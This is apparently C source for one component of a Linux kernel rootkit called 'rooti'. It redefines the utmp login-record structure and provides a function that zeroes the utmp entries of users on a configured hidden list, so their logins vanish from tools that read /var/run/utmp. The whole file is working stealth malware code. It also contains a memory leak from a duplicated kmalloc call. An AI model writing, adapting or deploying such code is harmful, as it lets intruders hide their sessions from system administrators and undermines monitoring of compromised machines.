#include <linux/types.h>
#include <linux/string.h>
#include "login.h"
#include "../../utils.h"
#include "../../config.h"

/*
    The following macros and structures are from the utmp.h userspace header.
    Each entry of the /var/run/utmp file is a structure of type struct utmp.
*/
#define EMPTY         0
#define RUN_LVL       1
#define BOOT_TIME     2
#define NEW_TIME      3
#define OLD_TIME      4
#define INIT_PROCESS  5
#define LOGIN_PROCESS 6
#define USER_PROCESS  7
#define DEAD_PROCESS  8
#define ACCOUNTING    9

#define UT_LINESIZE     32
#define UT_NAMESIZE     32
#define UT_HOSTSIZE     256

struct exit_status {
    short int e_termination;
    short int e_exit;
};

struct utmp {
    short   ut_type;
    pid_t   ut_pid;
    char    ut_line[UT_LINESIZE];
    char    ut_id[4];
    char    ut_user[UT_NAMESIZE];
    char    ut_host[UT_HOSTSIZE];
    struct  exit_status ut_exit;
#if defined __WORDSIZE && __WORDSIZE == 64 && defined __WORDSIZE_COMPAT32
    int32_t ut_session;
    struct {
        int32_t tv_sec;
        int32_t tv_usec;
    } ut_tv;
#else
    long   ut_session;
#endif
    int32_t ut_addr_v6[4];
    char __unused[20];
};

static bool rooti_should_hide_user(char *username)
{
    for (int i = 0; i < ROOTI_HIDDEN_USERS_COUNT; i++) {
        if (strncmp(username, ROOTI_HIDDEN_USERS[i], UT_NAMESIZE) == 0) {
            return true;
        }
    }
    return false;
}

int rooti_hide_login_entry(char *user_buf, size_t count)
{
    char *kernel_buf = kmalloc(count, GFP_KERNEL);
    struct utmp *utmp_buf;
    int ret;

    kernel_buf = kmalloc(count, GFP_KERNEL);
    if (kernel_buf == NULL) {
        ROOTI_DEBUG("failed to allocate memory");
        return -ENOMEM;
    }
    utmp_buf = (struct utmp *)kernel_buf;

    ret = copy_from_user(kernel_buf, user_buf, count);
    if (ret > 0) {
        ROOTI_DEBUG("copy_from_user() failed: %d", ret);
        kfree(kernel_buf);
        return -EFAULT;
    }

    if (rooti_should_hide_user(utmp_buf->ut_user)) {
        // Filling the buffer with zeros should do the trick
        memset(kernel_buf, 0, count);

        ret = copy_to_user(user_buf, kernel_buf, count);
        if (ret > 0) {
            ROOTI_DEBUG("copy_to_user() failed: %d", ret);
            kfree(kernel_buf);
            return -EFAULT;
        }
    }

    kfree(kernel_buf);
    return 0;
}